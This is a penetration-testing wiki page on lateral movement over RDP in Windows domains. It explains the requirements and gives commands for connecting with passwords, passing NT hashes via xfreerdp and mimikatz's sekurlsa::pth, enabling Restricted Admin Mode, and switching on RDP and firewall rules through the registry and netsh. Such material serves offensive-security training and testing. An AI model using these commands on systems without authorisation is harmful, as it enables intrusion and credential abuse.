---
label: RDP
---

# RDP (Remote Desktop Protocol) for Lateral Movement

> **Requirements**:
>
> * Credentials (password or >not by default< NT hash) of a member of the local **Administrators** or **Remote Desktop Users** group on the target machine.
> * RDP enabled on the target machine (disabled by default on both Server and client Windows).

**RDP (3389/TCP) is not active by default**. It must be explicitly enabled. By default, if you want to connect via RDP, you need to be a **local administrator** or a member of local **Remote Desktop Users** group on the target machine. Logon via RDP is of the **Remote Interactive type** (reusable credentials are available).

Linux:

```bash
# Using password
xfreerdp /u:$user /p:$password /v:$host /d:$domain
```

Windows:

```powershell
# Open RDP connection dialog (target user's password is required)
mstsc
```

## RDP Pass-the-Hash (Restricted Admin Mode)

Generally, **Pass-the-Hash is not possible using standard remote interactive RDP logon by default**. If you try to pass the hash, you will get an error stating that "Account Restrictions are preventing this user from signing in". Hovewer, pass the hash is possible when the machine has _Restricted Admin Mode_ enabled. This mode changes the interactive RDP logon to the network logon type so user's credentials are not passed to the target machine and cannot be reused further. **It is disabled by default**.

The good news is, if you have any level of administrative access to the machine, you can enable this feature remotely and perform a pass-the-hash attack. Remember, it changes the logon type so reusable credentials are not available on the machine!

Windows:

```powershell
# Enable Restricted Admin Mode
reg add "HKLM:\System\CurrentControlSet\Control\Lsa" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0

# Using NT hash
.\mimikatz.exe
> token::elevate
> sekurlsa::pth /user:$username /ntlm:$nt_hash /run:"mstsc.exe /restrictedadmin /v:$_host"
```

Linux:

```bash
# Using NT hash
xfreerdp /u:$user /pth:$nt_hash /v:$host /d:$domain
```

## Enable RDP with CMD

> **NOTE**: Windows Home doesn't have built-in RDP server. It's available on Windows Server, Pro and Enterprise editions.

If you have administrative access to the machine (e.g. via SmbExec or WinRM) you can activate RDP using CMD:

```powershell
# Enable RDP service
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Allow RDP on firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

## References

* [Kali.org, _Passing the Hash with Remote Desktop_](https://www.kali.org/blog/passing-hash-remote-desktop/)
* [Microsoft, _Restricted Admin Mode for RDP in Windows_](https://learn.microsoft.com/en-us/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2)
